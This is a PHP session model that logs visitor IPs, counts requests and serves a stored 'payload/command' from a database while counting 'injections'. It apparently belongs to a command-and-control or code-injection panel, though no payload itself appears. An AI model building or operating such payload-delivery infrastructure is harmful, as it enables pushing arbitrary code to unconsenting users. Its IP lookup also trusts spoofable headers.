<?php

class SessionModel extends BaseModel
{
    public function __construct($action, $isPost = false, $params = array())
    {
        parent::__construct(include('conf/config.php'));
        if($isPost)
        {
            call_user_func_array(array($this, $action.'_POST'), $params);
        }
        else
        {
            call_user_func_array(array($this, $action), $params);
        }
    }

    /* Index  */
    public function Index()
    {
        //Get ip & host
        $data = array
        (
            'ip' => $this->GetUserIP(),
            'host' => gethostname()
        );

        //Create Session
        $sql = "INSERT INTO sessions (
          requests,
          ip,
          host) VALUES (
            0,
            :ip,
            :host)";

        if($stmt = $this->database->prepare($sql))
        {
            $stmt->bindParam(':ip', $data['ip'], PDO::PARAM_STR);
            $stmt->bindParam(':host', $data['host'], PDO::PARAM_STR);

            $stmt->execute();
            $stmt->closeCursor();
        }

        $this->session_id = $this->database->lastInsertId();
    }

    public function Active($session_id)
    {
        //Update session
        $sql = "UPDATE sessions SET
          requests = requests + 1
          WHERE (id=:id)";

        if ($stmt = $this->database->prepare($sql)) {

            $stmt->bindParam(':id', $session_id, PDO::PARAM_STR);

            $stmt->execute();
            $stmt->closeCursor();
        }

        //Get current payload/command id
        $command_id = null;
        $sql = "SELECT * FROM state";
        if ($stmt = $this->database->prepare($sql)) {
            $stmt->execute();
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $command_id = $row["command_id"];
        }

        //Get current payload/command
        $payload = '';
        if($command_id)
        {
            $sql = "SELECT * FROM commands WHERE id=:id";
            if ($stmt = $this->database->prepare($sql)) {
                $stmt->bindParam(':id', $command_id, PDO::PARAM_STR);

                $stmt->execute();
                $row = $stmt->fetch(PDO::FETCH_ASSOC);
                $payload = $row["code"];
            }

            $this->database->query('UPDATE state SET injections = injections + 1 WHERE id=1');
        }
        $this->payload = $payload;
    }

    public function End($session_id)
    {
        //End session
        $sql = "UPDATE sessions SET
          is_active = 0
          WHERE (id=:id)";

        if ($stmt = $this->database->prepare($sql)) {

            $stmt->bindParam(':id', $session_id, PDO::PARAM_STR);

            $stmt->execute();
            $stmt->closeCursor();
        }
    }



    public function GetUserIP()
    {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];

        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }

        return $ip;
    }
}